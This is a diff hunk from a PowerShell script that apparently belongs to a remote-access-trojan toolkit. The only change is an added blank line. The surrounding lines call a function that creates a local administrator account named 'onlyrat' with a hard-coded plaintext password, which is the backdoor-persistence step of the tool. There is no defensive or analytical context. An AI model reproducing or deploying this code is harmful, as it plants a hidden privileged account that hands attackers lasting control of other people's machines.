@@ -24,6 +24,7 @@ function Create-NewLocalAdmin {
     end {
     }
 }
+
 $NewLocalAdmin = "onlyrat"
 $Password = (ConvertTo-SecureString "OnlyRat123" -AsPlainText -Force)
 Create-NewLocalAdmin -NewLocalAdmin $NewLocalAdmin -Password $Password
